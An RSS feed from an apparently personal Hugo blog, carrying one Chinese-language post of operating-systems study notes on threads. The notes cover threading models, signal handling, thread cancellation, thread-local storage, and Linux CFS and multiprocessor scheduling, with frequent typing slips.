<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Example Site</title>
        <link>https://example.com/post/</link>
        <description>Recent content in Posts on Example Site</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>Example Person</copyright>
        <lastBuildDate>Fri, 01 Aug 2025 21:50:00 +0800</lastBuildDate><atom:link href="https://example.com/post/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>线程</title>
        <link>https://example.com/p/%E7%BA%BF%E7%A8%8B/</link>
        <pubDate>Fri, 01 Aug 2025 21:50:00 +0800</pubDate>
        
        <guid>https://example.com/p/%E7%BA%BF%E7%A8%8B/</guid>
        <description>&lt;h1 id=&#34;线程&#34;&gt;线程
&lt;/h1&gt;&lt;h2 id=&#34;相关概念&#34;&gt;相关概念
&lt;/h2&gt;&lt;h3 id=&#34;定义&#34;&gt;定义
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;定义：线程是独立的指令流，可以被内核调度运行&lt;/li&gt;
&lt;li&gt;进程包含的状态和资源
&lt;ul&gt;
&lt;li&gt;代码、堆、数据、文件句柄（包括套接字）、进程间通信（IPC）&lt;/li&gt;
&lt;li&gt;进程ID、进程组ID、用户ID&lt;/li&gt;
&lt;li&gt;栈、寄存器、程序计数器（PC）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;线程与进程关系
&lt;ul&gt;
&lt;li&gt;线程存在于进程内部，并共享进程的资源&lt;/li&gt;
&lt;li&gt;每个线程都有自己的核心资源（线程独有资源）
&lt;ul&gt;
&lt;li&gt;栈&lt;/li&gt;
&lt;li&gt;寄存器&lt;/li&gt;
&lt;li&gt;程序计数器&lt;/li&gt;
&lt;li&gt;线程特定数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;访问共享资源需要同步&lt;/li&gt;
&lt;li&gt;线程由内核独立调度&lt;/li&gt;
&lt;li&gt;每个线程都有自己独立的控制流&lt;/li&gt;
&lt;li&gt;每个线程都可以处于任何调度状态&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;线程的优势&#34;&gt;线程的优势
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;响应性：多线程交互应用程序允许程序即使在部分被阻塞或执行长时间操作时也能继续运行&lt;/li&gt;
&lt;li&gt;资源共享：资源共享可以实现高校通信和高度协作。线程默认共享进程的资源和内存。&lt;/li&gt;
&lt;li&gt;经济性：线程比进程更轻量级，创建和上下文切换的开销更小&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;多线程服务器架构&#34;&gt;多线程服务器架构
&lt;/h2&gt;&lt;h3 id=&#34;架构示意图&#34;&gt;架构示意图
&lt;/h3&gt; &lt;p align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://example.com/images/thread1.png&#34; alt=&#34;server&#34; width=&#34;75%&#34;&gt;
&lt;/p&gt;
* 工作方式解释：server的主进程（一般是监听进程）接受客户端的请求，然后主进程创建一个新的线程来处理请求。之后主监听进程继续监听其他的客户端请求
&lt;h3 id=&#34;注并发与并行&#34;&gt;注：并发与并行
&lt;/h3&gt;&lt;h4 id=&#34;定义-1&#34;&gt;定义
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;并发计算是一种计算形式，其中程序被设计为相互交互的计算进程集合，这些进程可以并行执行。并发程序（进程或线程）可以在单个处理器上通过时间片轮转的方式交错执行各自的执行步骤，也可以通过将每个计算进程分配给一组处理器来并行执行。程序作为独立执行进程的组合，这些进程相互通信。&lt;/li&gt;
&lt;li&gt;行计算是一种计算形式，其中许多计算同时进行，基于大问题通常可以分解为较小问题的原理，然后&amp;quot;并行&amp;quot;解决这些小问题。
编程作为（可能相关的）计算的同时执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;对比&#34;&gt;对比
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;维度&lt;/th&gt;
          &lt;th&gt;并发 (Concurrency)&lt;/th&gt;
          &lt;th&gt;并行 (Parallelism)&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;核心概念&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;同一时间段内交替执行&lt;/td&gt;
          &lt;td&gt;同一时刻真正同时执行&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;硬件要求&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;单核CPU即可&lt;/td&gt;
          &lt;td&gt;必须多核CPU或多台机器&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;设计思想&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;如何组织和管理任务&lt;/td&gt;
          &lt;td&gt;如何真正同时计算&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;主要目的&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;提高响应性、资源利用率&lt;/td&gt;
          &lt;td&gt;提高计算速度&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;关键理解&#34;&gt;关键理解
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;并发关乎结构，并行关乎执行&lt;/li&gt;
&lt;li&gt;并发提供了一种构建解决方案的方式来解决一个可能（但不一定）可并行化的问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;线程的实现&#34;&gt;线程的实现
&lt;/h2&gt;&lt;h3 id=&#34;基本信息&#34;&gt;基本信息
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;线程可以在用户级别或由内核提供&lt;/li&gt;
&lt;li&gt;用户线程在内核之上支持，无需内核支持即可管理
&lt;ul&gt;
&lt;li&gt;三个线程库：POSIX Pthreads、Win32线程和Java线程&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内核线程由内核直接支持和管理
&lt;ul&gt;
&lt;li&gt;所有现代操作系统都支持内核线程&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;线程实现的方式&#34;&gt;线程实现的方式
&lt;/h3&gt;&lt;h4 id=&#34;内核级线程&#34;&gt;内核级线程
&lt;/h4&gt;&lt;h5 id=&#34;定义-2&#34;&gt;定义
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;为了使并发更经济，进程的执行方面被分离为线程。因此，操作系统现在管理线程和进程。所有线程操作都在内核中实现，操作系统调度系统中的所有线程。由操作系统管理的线程成为内核级线程。&lt;/li&gt;
&lt;li&gt;在这种方法中，内核知道并管理线程。这种情况下不需要运行系统。内核不是在每个进程中保持线程表，而是拥有一个线程表来跟踪系统中的所有线程。此外，内核还维护传统的进程表来跟踪进程。操作系统内核提供系统调用来创建和管理线程。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;优势&#34;&gt;优势
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;因为内核完全了解所有线程，调度器可能决定给拥有大量线程的进程分配更多时间，而不是给拥有少量线程的进程。&lt;/li&gt;
&lt;li&gt;内核级线程对于频繁阻塞的应用程序特别有效&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;劣势&#34;&gt;劣势
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;内核级线程速度慢而且效率低&lt;/li&gt;
&lt;li&gt;存在显著的开销和内核复杂性的增加&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;用户级线程&#34;&gt;用户级线程
&lt;/h4&gt;&lt;h5 id=&#34;定义-3&#34;&gt;定义
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;用户级显示完全由运行时系统（用户级库）管理内核对用户级线程一无所知，将它们作为单线程进程管理。用户级线程小而快，每个线程由PC、寄存器、栈和小型线程控制块表示。创建新线程、线程间切换和线程同步都通过过程调用完成，即无内核参与。用户及线程比内核级线程块100倍。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;优势-1&#34;&gt;优势
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;这种技术最明显的优势是用户级线程包可以在不支持的线程的操作系统上实现&lt;/li&gt;
&lt;li&gt;用户级线程不需要修改操作系统&lt;/li&gt;
&lt;li&gt;简单表示：每个线程简单地由PC、寄存器、栈和小型控制块表示，都存储在用户进程地址空间中&lt;/li&gt;
&lt;li&gt;简单管理：这意味着创建线程和线程间同步都可以在没有内核干预的情况下完成&lt;/li&gt;
&lt;li&gt;快速高效：线程切换比过程调用贵不了多少&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;劣势-1&#34;&gt;劣势
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;用户级线程不是完美解决方案，它们是一种权衡。由于用户级线程对操作系统不可见，它们与操作系统集成不好。结果是，操作系统可能做出糟糕决策，如调度有空闲线程的进程、阻塞启动I/O的线程所在的进程（即使该进程有其他可运行线程）、取消调度持有锁的线程所在的进程。解决者需要内核和用户级线程管理器之间的通信。&lt;/li&gt;
&lt;li&gt;线程和操作系统内核之间缺乏协调。因此，整个进程获得一个时间片，无论进程有一个线程还是1000个线程。每个线程都要主动放弃控制权给其他线程。&lt;/li&gt;
&lt;li&gt;用户级线程需要非阻塞调用，即多线程内核。，否则，整个进程将在内核中阻塞，即使进程中还有可运行的线程。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;多线程模型&#34;&gt;多线程模型
&lt;/h2&gt;&lt;h3 id=&#34;含义&#34;&gt;含义：
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;用户线程和内核线程之间必须存在关系&lt;/li&gt;
&lt;li&gt;内核线程是系统中真正的线程，所以为了使用户线程取得进展，用户程序必须让其调度器获取一个用户线程，然后再内核线程上运行它&lt;/li&gt;
&lt;li&gt;核心：只有内核线程真正在CPU上执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;多线程模型详解&#34;&gt;多线程模型详解
&lt;/h3&gt;&lt;h4 id=&#34;多对一模型many-to-one&#34;&gt;多对一模型(Many-to-one)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;多个用户级线程映射到单个内核线程&lt;/li&gt;
&lt;li&gt;线路管理由用户空间的线程库完成&lt;/li&gt;
&lt;li&gt;如果一个线程进程阻塞系统调用，整个进程将被阻塞&lt;/li&gt;
&lt;li&gt;将阻塞系统调用转换为非阻塞&lt;/li&gt;
&lt;li&gt;多个线程无法再多处理器上并行运行&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;一对一模型one-to-one&#34;&gt;一对一模型(One-to-one)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;每个用户级线程映射到一个内核线程&lt;/li&gt;
&lt;li&gt;允许其他线程在一个线程阻塞时运行&lt;/li&gt;
&lt;li&gt;多个线程可以在多处理器上并行运行&lt;/li&gt;
&lt;li&gt;总计金额导致开销&lt;/li&gt;
&lt;li&gt;大多数实现次模型的操作系统限制线程数量&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;多对多模型&#34;&gt;多对多模型
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;许多用户级线程映射到许多内核线程&lt;/li&gt;
&lt;li&gt;解决了1:1和m:1模型的缺点&lt;/li&gt;
&lt;li&gt;开发人员可以创建必要数量的用户线程&lt;/li&gt;
&lt;li&gt;相应的内核线程可以在多处理器上并行运行&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;两级模型&#34;&gt;两级模型
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;类似对于多对多模型，除了它允许用户线程绑定到内核线程&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;fork和exec的语义问题&#34;&gt;fork和exec的语义问题
&lt;/h3&gt;&lt;h4 id=&#34;fork&#34;&gt;fork
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;当对单线程进程fork时，直接复制整个单线程进程&lt;/li&gt;
&lt;li&gt;当读多线程进程fork时，可以理解为只复制调用线程或复制所有线程，在UNIX中有两个版本的fork，每种语义一个&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;exec&#34;&gt;exec
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;exec通常替换整个进程&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;fork与exec的综合使用&#34;&gt;fork与exec的综合使用
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;如果在fork后很快调用exec，使用“fork调用线程版本”，不需要复制所有线程&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;信号处理&#34;&gt;信号处理
&lt;/h2&gt;&lt;h3 id=&#34;概念&#34;&gt;概念
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;信号在UNIX系统中用于通知进程发生了特定事件，遵循相同的模式&lt;/li&gt;
&lt;li&gt;信号由特定事件的发生而产生&lt;/li&gt;
&lt;li&gt;信号倍传递给进程&lt;/li&gt;
&lt;li&gt;一旦传递，信号必须被处理&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;原则&#34;&gt;原则
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;信号由两种信号处理程序之一处理：默认的或用户定义的&lt;/li&gt;
&lt;li&gt;每个信号都有默认处理程序，内核在处理信号时运行&lt;/li&gt;
&lt;li&gt;用户定义的信号处理程序可以覆盖默认的&lt;/li&gt;
&lt;li&gt;对于单线程，信号传递给进程&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;多线程环境下的信号处理&#34;&gt;多线程环境下的信号处理
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;信号可以是同步的（异常）或异步的（I/O）&lt;/li&gt;
&lt;li&gt;同步信号传递给引起信号的同一线程&lt;/li&gt;
&lt;li&gt;一部信号可以传递给
&lt;ul&gt;
&lt;li&gt;信号适用的线程&lt;/li&gt;
&lt;li&gt;进程中的每个线程&lt;/li&gt;
&lt;li&gt;进程中的某些线程（信号掩码）&lt;/li&gt;
&lt;li&gt;接收进程所有信号的特定线程&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;线程取消&#34;&gt;线程取消
&lt;/h2&gt;&lt;h3 id=&#34;概念-1&#34;&gt;概念
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;线程取消：在目标线程完成之前终止它&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;取消的实现方法&#34;&gt;取消的实现方法
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;异步取消：立即终止目标线程&lt;/li&gt;
&lt;li&gt;延迟取消：允许目标线程定期检查是否应该被取消&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;取消的实现细节&#34;&gt;取消的实现细节
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;调用线程取消请求取消，但是实际取消取决于线程状态&lt;/li&gt;
&lt;li&gt;如果线程禁用了取消，取消保持挂起状态直到线程启用它&lt;/li&gt;
&lt;li&gt;默认类型时延迟取消&lt;/li&gt;
&lt;li&gt;取消只在线程到达取消点时发生
&lt;ul&gt;
&lt;li&gt;即pthread_testcancel()&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;然后调用清理处理程序&lt;/li&gt;
&lt;li&gt;在Linux系统上，线程取消通过信号处理&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;线程特定数据thread-specifif-data&#34;&gt;线程特定数据(Thread Specifif Data)
&lt;/h2&gt;&lt;h3 id=&#34;线程特定数据&#34;&gt;线程特定数据
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;线程本地存储(TLS)允许每个线程拥有自己的数据副本&lt;/li&gt;
&lt;li&gt;当你无法控制线程创建过程时很有用（即使用线程池时）&lt;/li&gt;
&lt;li&gt;与局部变量不同&lt;/li&gt;
&lt;li&gt;局部变量只在单个函数调用期间可见&lt;/li&gt;
&lt;li&gt;TLS在函数调用间可见&lt;/li&gt;
&lt;li&gt;类似于静态数据&lt;/li&gt;
&lt;li&gt;TLS对每个线程都是唯一的&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;轻量级进程与调度器激活&#34;&gt;轻量级进程与调度器激活
&lt;/h2&gt;&lt;h3 id=&#34;轻量级进程概念&#34;&gt;轻量级进程概念
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;在计算机操作系统中，轻量级进程（LWP）是实现多任务的一种方式。在传统意义上，如Unix System V和Solaris中使用的术语，LWP在用户空间中运行在单个内核线程之上，并与同一进程内的其他LWP共享地址空间和系统资源。多个用户级线程由线程库管理，可以放置在一个或多个LWP之上——允许在用户级进行多任务处理，这可以带来一些性能优势&lt;/li&gt;
&lt;li&gt;在一些操作系统中，内核线程和用户线程之间没有单独的LWP层。这意味着用户线程直接在内核线程之上实现。在这些情况下，术语&amp;quot;轻量级进程&amp;quot;通常指内核线程，而术语&amp;quot;线程&amp;quot;可以指用户线程。在Linux上，用户线程通过允许某些进程共享资源来实现，这有时导致这些进程被称为&amp;quot;轻量级进程&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;调度方式&#34;&gt;调度方式
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;轻量级进程(LWP)是多对多和两级模型中用户线程和内核线程之间的中间数据集二狗&lt;/li&gt;
&lt;li&gt;对用户线程库来说，它看起来像虚拟处理器来调度用户线程&lt;/li&gt;
&lt;li&gt;每个LWP都连接到一个内核线程&lt;/li&gt;
&lt;li&gt;内核线程阻塞 -&amp;gt; LWP阻塞 -&amp;gt; 用户线程阻塞&lt;/li&gt;
&lt;li&gt;内核调度内核线程，线程库调度用户线程&lt;/li&gt;
&lt;li&gt;线程库可能做出次优的调度决策&lt;/li&gt;
&lt;li&gt;解决方案：让内核通知线程库的重要的调度事件&lt;/li&gt;
&lt;li&gt;调度器激活通过上调通知线程库&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;windos-xp线程&#34;&gt;Windos XP线程
&lt;/h2&gt;&lt;h3 id=&#34;概念-2&#34;&gt;概念
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Windos XP实现一对一映射线程模型&lt;/li&gt;
&lt;li&gt;每个线程包含
&lt;ul&gt;
&lt;li&gt;线程ID&lt;/li&gt;
&lt;li&gt;处理器状态的寄存器集&lt;/li&gt;
&lt;li&gt;堵路的用户栈和内核栈&lt;/li&gt;
&lt;li&gt;私有数据存储区域&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;线程的主要数据结构包括
&lt;ul&gt;
&lt;li&gt;ETHREAD：执行线程块（&lt;/li&gt;
&lt;li&gt;KTHREAD：内核线程块&lt;/li&gt;
&lt;li&gt;TEB：线程环境块&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;linux线程&#34;&gt;Linux线程
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;linux有fork和clone两个系统调用&lt;/li&gt;
&lt;li&gt;clone接收一组标志位，决定父进程和子进程之间的共享程度&lt;/li&gt;
&lt;li&gt;FS/VM/SIGHAND/FILES -&amp;gt; 相当于线程创建&lt;/li&gt;
&lt;li&gt;没有设置标志 -&amp;gt; 没有共享 -&amp;gt; 相当于fork&lt;/li&gt;
&lt;li&gt;Linux不区分进程和线程，使用术语“任务”而不是线程&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;线程库&#34;&gt;线程库
&lt;/h2&gt;&lt;h3 id=&#34;概念-3&#34;&gt;概念
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;线程库为程序员提供了创建和管理线程的API接口&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;两种主要实现方式&#34;&gt;两种主要实现方式
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;用户空间实现
&lt;ul&gt;
&lt;li&gt;完全在用户空间中实现，无需内核支持&lt;/li&gt;
&lt;li&gt;特点：快速、轻量级，但无法利用多核&lt;/li&gt;
&lt;li&gt;示例：早期的Green Threads&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内核级实现
&lt;ul&gt;
&lt;li&gt;由操作系统支持的内核级库&lt;/li&gt;
&lt;li&gt;特点：可以真正并行，但开销较大&lt;/li&gt;
&lt;li&gt;示例：现代操作系统的标准实现&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;线程特性&#34;&gt;线程特性
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;线程拥有自己的身份标识，并且可以独立运行&lt;/li&gt;
&lt;li&gt;线程共享进程内的地址空间，享受避免任何进程间通信(IPC)通道（共享内存、管道等）进行通信的好处&lt;/li&gt;
&lt;li&gt;进程中的线程可以直接相互通信&lt;/li&gt;
&lt;li&gt;例如独立的线程可以访问/更新全局变量&lt;/li&gt;
&lt;li&gt;这种模型消除了内核本来需要承担的潜在IPC开销。由于线程在同一地址空间中，线程上下文切换是廉价且快速的&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;pthread调度&#34;&gt;Pthread调度
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;API允许在线程创建时指定PCS或SCS调度范围&lt;/li&gt;
&lt;li&gt;pthread_attr_set/getscope是相关的API&lt;/li&gt;
&lt;li&gt;PTHREAD_SCOPE_PROCESS：使用PCS调度来调度线程&lt;/li&gt;
&lt;li&gt;LWP的数量由线程库维护&lt;/li&gt;
&lt;li&gt;PTHREAD_SCOPE_SYSTEM：使用SCS调度来调度线程&lt;/li&gt;
&lt;li&gt;可用的调度范围可能受到操作系统的限制&lt;/li&gt;
&lt;li&gt;例如：Linux和Mac OS X只允许PTHREAD_SCOPE_SYSTEM&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;多处理器调度&#34;&gt;多处理器调度
&lt;/h2&gt;&lt;h3 id=&#34;多处理器架构类型&#34;&gt;多处理器架构类型
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;多处理器可能是以下任一架构
&lt;ul&gt;
&lt;li&gt;多核CPU&lt;/li&gt;
&lt;li&gt;多线程核心&lt;/li&gt;
&lt;li&gt;NUMA系统&lt;/li&gt;
&lt;li&gt;异构多处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;多处理器调度基础
&lt;ul&gt;
&lt;li&gt;当有多个CPU可用时，CPU调度变得更加复杂&lt;/li&gt;
&lt;li&gt;假设处理器在功能上时相同的（同构的）&lt;/li&gt;
&lt;li&gt;多处理器调度的方法&lt;/li&gt;
&lt;li&gt;非堆成多处理：
&lt;ul&gt;
&lt;li&gt;只有一个处理器做调度决策、I/O处理和其他活动&lt;/li&gt;
&lt;li&gt;其他处理器充当虚拟处理单元&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对称多处理(SMP)：每个处理器都是自调度的
&lt;ul&gt;
&lt;li&gt;调度数据结构是共享的，需要同步&lt;/li&gt;
&lt;li&gt;被通用操作系统使用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SMP架构细节
&lt;ul&gt;
&lt;li&gt;对称多处理(SMP)是每个处理器都自调度的架构&lt;/li&gt;
&lt;li&gt;所有线程可能在一个公共就绪队列中(a)&lt;/li&gt;
&lt;li&gt;或者每个处理器可能有自己的私有线程队列(b)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;多核调度
&lt;ul&gt;
&lt;li&gt;单芯片中的多个CPU核心&lt;/li&gt;
&lt;li&gt;最近的趋势是在同一物理芯片上防止多个处理器核心，更快且功耗更低&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;芯片多线程(CMT)
&lt;ul&gt;
&lt;li&gt;多线程核心：芯片多线程&lt;/li&gt;
&lt;li&gt;Intel使用超线程术语（或同时多线程-SMT）：在同一核心上同时运行两个（或更多）硬件线程：内存停顿&lt;/li&gt;
&lt;li&gt;利用内存停顿在内存检索时在另一个线程上取得进展&lt;/li&gt;
&lt;li&gt;每个核心有&amp;gt;1个硬件线程。如果一个线程有内存停顿，切换到另一个线程！&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CMT的两级调度
&lt;ul&gt;
&lt;li&gt;两级调度：
&lt;ul&gt;
&lt;li&gt;操作系统决定在逻辑CPU上运行哪个软件线程&lt;/li&gt;
&lt;li&gt;每个核心如何决定在物理核心上运行哪个硬件线程。两个硬件线程不能并行运行，因为我们只有一个CPU核心&lt;/li&gt;
&lt;li&gt;如果操作系统知道CPU资源的底层共享情况，可以做出更好的决策&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;负载均衡
&lt;ul&gt;
&lt;li&gt;如果是SMP，需要保持所有CPU的负载以提高效率&lt;/li&gt;
&lt;li&gt;负载均衡试图保持工作负载均匀分布&lt;/li&gt;
&lt;li&gt;推送迁移 - 周期性任务检查每个处理器的负载，如果发现则将任务从过载的CPU推送到其他CPU&lt;/li&gt;
&lt;li&gt;拉取迁移 - 空闲处理器从繁忙处理器拉取等待任务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;处理器亲和性
&lt;ul&gt;
&lt;li&gt;当线程在一个处理器上运行时，该处理器的缓存内容存储该线程的内存访问&lt;/li&gt;
&lt;li&gt;我们称这为线程对处理器有亲和性（即&amp;quot;处理器亲和性&amp;quot;）&lt;/li&gt;
&lt;li&gt;负载均衡可能影响处理器亲和性，因为线程可能从一个处理器移动到另一个处理器以平衡负载，但该线程失去了在其移出的处理器缓存中的内容&lt;/li&gt;
&lt;li&gt;软亲和性 - 操作系统试图保持线程在同一处理器上运行，但不保证&lt;/li&gt;
&lt;li&gt;硬亲和性 - 允许进程指定一组它可以运行的处理器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NUMA和CPU调度
&lt;ul&gt;
&lt;li&gt;如果操作系统是NUMA感知的，它将分配靠进展线程运行CPU的内存&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;实时CPU调度
&lt;ul&gt;
&lt;li&gt;可能出现明显的挑战&lt;/li&gt;
&lt;li&gt;软实时系统-关键实时任务有最高优先级，但不保证任务何时被调度&lt;/li&gt;
&lt;li&gt;硬实时系统-任务必须在其截止时间前得到服务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;linux-2623-完全公平调度器cfs详解&#34;&gt;Linux 2.6.23+ 完全公平调度器(CFS)详解
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Linux调度器版本2.6.23+
&lt;ul&gt;
&lt;li&gt;完全公平调度器(CFS)&lt;/li&gt;
&lt;li&gt;调度类&lt;/li&gt;
&lt;li&gt;每个调度类都有特定的优先级&lt;/li&gt;
&lt;li&gt;调度器选择最高优先级调度类中的最高优先级任务&lt;/li&gt;
&lt;li&gt;不是基于固定时间分配的量子，而是基于CPU时间比例(nice值)&lt;/li&gt;
&lt;li&gt;较少的nice值将获得更高比例的CPU时间&lt;/li&gt;
&lt;li&gt;包含2个调度类，其他可以添加
&lt;ul&gt;
&lt;li&gt;默认调度类&lt;/li&gt;
&lt;li&gt;实时调度类&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CFS量子计算细节
&lt;ul&gt;
&lt;li&gt;量子基于nice值计算，从-20到+19&lt;/li&gt;
&lt;li&gt;较低的值是更高的优先级&lt;/li&gt;
&lt;li&gt;计算目标延迟 - 任务应该至少运行一次的时间间隔&lt;/li&gt;
&lt;li&gt;如果活跃任务数量增加，目标延迟可以增加&lt;/li&gt;
&lt;li&gt;CFS调度器在变量vruntime中维护每个任务的虚拟运行时间&lt;/li&gt;
&lt;li&gt;与基于任务优先级的衰减因子相关联 - 较低优先级有较高的衰减率&lt;/li&gt;
&lt;li&gt;正常默认优先级产生虚拟运行时间 = 实际运行时间&lt;/li&gt;
&lt;li&gt;要决定下一个运行的任务，调度器选择虚拟运行时间最低的任务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;linux调度系统补充详解&#34;&gt;Linux调度系统补充详解
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Linux实时调度
&lt;ul&gt;
&lt;li&gt;根据POSIX.1b标准的实时调度&lt;/li&gt;
&lt;li&gt;实时任务具有静态优先级&lt;/li&gt;
&lt;li&gt;实时任务加上普通任务映射到全局优先级方案&lt;/li&gt;
&lt;li&gt;Nice值-20映射到全局优先级100&lt;/li&gt;
&lt;li&gt;Nice值+19映射到优先级139&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linux负载均衡与NUMA
&lt;ul&gt;
&lt;li&gt;Linux支持负载均衡，但也是NUMA感知的&lt;/li&gt;
&lt;li&gt;调度域是一组可以相互平衡的CPU核心集合&lt;/li&gt;
&lt;li&gt;域按它们共享的内容（即缓存内存）组织。目标是防止线程在域之间迁移&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
